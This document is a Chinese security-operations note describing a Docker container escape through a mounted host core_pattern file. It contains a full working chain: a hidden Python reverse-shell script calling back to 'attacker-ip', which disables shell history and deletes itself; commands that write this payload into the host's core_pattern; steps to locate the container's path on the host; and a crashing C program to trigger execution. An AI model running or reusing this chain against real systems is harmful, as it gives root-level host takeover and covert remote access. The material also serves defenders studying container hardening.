---
id: "doc-267469fbdbb7"
title: "挂载宿主机procfs 导致反弹shell"
date: "2023-04-14T15:57:00"
categories: ["安全与堡垒机", "安全运维"]
tags: ["安全与堡垒机", "安全运维", "Linux", "Docker", "恶意代码", "权限管理", "知识笔记"]
source: "03-安全运营与应急/07-工作运维离线知识库/04-安全运维/birdben/68652198.html"
---

# 挂载宿主机procfs 导致反弹shell

## 挂载宿主机procfs

> 利用procfs通过写/proc/sys/kernel/core_pattern来进行逃逸，触发条件比较苛刻，需要有进程奔溃才能触发

```bash
docker run -itd -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu (为了区分，挂载到容器的/host/目录下
```

> procfs是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多十分敏感重要的文件。因此，将宿主机的procfs挂载到不受控的容器中也是十分危险的，尤其是在该容器内默认启用root权限，且没有开启User Namespace时

从2.6.19内核版本开始，Linux支持在/proc/sys/kernel/core_pattern中使用新语法。如果该文件中的首个字符是管道符|，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行。

**Docker默认情况下不会为容器开启User Namespace**

> 一般情况下不会将宿主机的procfs挂载到容器中，然而有些业务为了实现某些特殊需要，还是会有。

**判断方法：**

实战中通过find命令，可查找类似`core_pattern`、`/proc/sys/kernel/core_pattern`等高危目录和文件

**复现：**

“在挂载procfs的容器内利用core_pattern后门实现逃逸“

**利用思路：**

攻击者进入到挂载了宿主机profs的容器，root权限，然后向宿主机的procfs写Payload

 1、在容器内创建反弹Shell的Exp，/tmp/.x.py (.为隐藏文件

```bash
apt-get updateapt-get install vimapt-get install gcc (用于编译一个可以崩溃的程序，容器环境下一般都不自带这些常用的工具，包括ping之类的。
```

```
#.x.pyimport osimport ptyimport socketlhost = "attacker-ip"lport = 10000def main(): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((lhost, lport)) os.dup2(s.fileno(), 0) os.dup2(s.fileno(), 1) os.dup2(s.fileno(), 2) os.putenv("HISTFILE", "/dev/null") pty.spawn("/bin/bash") os.remove("/tmp/.x.py") s.close()if __name__ == "__main__": main()
```

2、写入core_pattern

```
echo -e "|/tmp/.x.py \rcore " > /host/proc/sys/kernel/core_pattern
```

执行完以上命令，然后运行'3'的崩溃程序之后，并没有接收到反弹的shell，

> 这是因为Linux转储机制对/proc/sys/kernel/core_pattern内程序的查找是在宿主机文件系统进行的，而我们的/tmp/.x.py是容器内路径。

**操作以下步骤：**

在Docker容器中运行`cat /proc/mounts | grep docker`拿到当前容器在宿主机上的绝对路径。

返回如下：

```
overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/TDUPJY7LZWCBS33AOAEL32VYWZ:/var/lib/docker/overlay2/l/UDBKLTSYHMCC4J7DLMAK3JUMT2:/var/lib/docker/overlay2/l/ULFSCIS7UXEVHUTW5KPOWLQOK6:/var/lib/docker/overlay2/l/YQDQOJ3EJ3KELBHK5PFFUJ7RVT,upperdir=/var/lib/docker/overlay2/edbf849399cdbcd1d74d7e112b0d548e60e0e90754e3126f8b533ab395bf1dfb/diff,workdir=/var/lib/docker/overlay2/edbf849399cdbcd1d74d7e112b0d548e60e0e90754e3126f8b533ab395bf1dfb/work 0 0
```

从返回的内容中得到：

```
workdir=/var/lib/docker/overlay2/edbf849399cdbcd1d74d7e112b0d548e60e0e90754e3126f8b533ab395bf1dfb/work
```

**将之前的写入Payload的命令改为：**

```
echo -e "|/var/lib/docker/overlay2/edbf849399cdbcd1d74d7e112b0d548e60e0e90754e3126f8b533ab395bf1dfb/merged/tmp/.x.py \rcore " > /host/proc/sys/kernel/core_pattern
```

这样一来，Linux转储机制在程序发生崩溃时就能够顺利找到我们在容器内部的/tmp/.x.py了。

3、在容器内运行一个可以崩溃的程序

```
//test.cint main(void) {int *a = NULL;*a = 1;return 0;}
```

```
gcc test.c
```

执行之后，即可接收到反弹的shell
